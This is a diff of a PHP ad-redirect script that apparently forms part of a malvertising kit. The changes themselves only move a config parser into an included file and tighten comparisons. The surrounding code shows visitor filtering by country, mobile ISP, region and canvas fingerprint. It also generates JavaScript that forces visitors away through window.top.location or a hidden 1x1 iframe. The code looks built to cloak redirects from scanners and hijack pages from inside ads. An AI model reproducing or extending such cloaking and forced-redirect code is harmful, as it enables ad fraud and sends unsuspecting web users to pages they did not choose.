@@ -14,6 +14,8 @@
 	// Ad configuration resides in the <id>.config.txt file, and can define the redirectUrl, the ad language (locale), and which redirect method should be used.
 	//
 
+	require_once("adlib.inc");
+
 	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
 												 "T-Mobile USA",
 												 "Sprint PCS",
@@ -513,35 +515,6 @@
 	    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
 	}
 
-	function trimNewLine($string)
-	{
-		return str_replace(PHP_EOL, '', $string);
-	}
-
-	function processConfig($filename)
-	{
-		$result = array();
-
-		$f = fopen($filename, "r");
-
-	    while (($line = fgets($f)) !== false)
-	    {
-	        $colonIndex = strpos($line, ":");
-
-	        if ($colonIndex !== false)
-	        {
-		    	$key = trim(substr($line, 0, $colonIndex));
-		    	$value = trim(trimNewLine(substr($line, $colonIndex + 1)));
-
-		    	$result[$key] = $value;
-		    }
-	    }
-
-	    fclose($f);
-
-	    return $result;
-	}
-
 	function appendParameterPrefix($url)
 	{
 		if (strpos($url, "?") === false)
@@ -684,15 +657,15 @@
 
 	$adConfig = processConfig($configFilename);
 
-	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] == "false" ? false : true;
+	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
 	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig['RedirectUrl'] : "";
 	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig['Method'] : "";
 	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig['RedirectTimeout'] : 3000;
-	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] == "false" ? false : true;
+	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
 	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig['CountryCode'] : "";
 	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig['ProvinceBlackList'], -1, PREG_SPLIT_NO_EMPTY) : array();
 	$blacklistedCities 				= array_key_exists("CityBlackList", $adConfig) ? preg_split("/\|/", $adConfig['CityBlackList'], -1, PREG_SPLIT_NO_EMPTY) : array();
-	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] == "false" ? false : true;
+	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] === "false" ? false : true;
 	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig['BlockedCanvasFingerprints'] : "";
 	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig['OutputMethod'] : "";
 
@@ -825,7 +798,7 @@
 		$resultHtml = str_replace("{script}", "", $resultHtml);
 		$resultHtml = str_replace("{onload}", "", $resultHtml);
 
-		if ($outputMethod == "JS")
+		if ($outputMethod === "JS")
 		{
 			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);
 
@@ -845,7 +818,7 @@
 		$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);
 
 		// Append passed in script parameters if outputMethod == JS
-		if ($outputMethod == "JS")
+		if ($outputMethod === "JS")
 		{
 			$redirectUrl .= appendParameterPrefix($redirectUrl) . $queryString;
 		}
@@ -858,15 +831,15 @@
 			adlog($campaignID, $redirectUrl);
 		}
 
-		if ($redirectMethod == "windowlocation")
+		if ($redirectMethod === "windowlocation")
 		{
 			$redirectCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
 		}
-		else if ($redirectMethod == "windowtoplocation")
+		else if ($redirectMethod === "windowtoplocation")
 		{
 			$redirectCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
 		}
-		else if ($redirectMethod == "1x1iframe")
+		else if ($redirectMethod === "1x1iframe")
 		{
 			$redirectCode = "var el = document.createElement('iframe');
 							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
@@ -988,7 +961,7 @@
 
 					   </script>";
 
-		if ($outputMethod == "JS")
+		if ($outputMethod === "JS")
 		{
 			$scriptCode .= "\n<script type=\"text/javascript\">go();</script>";
 
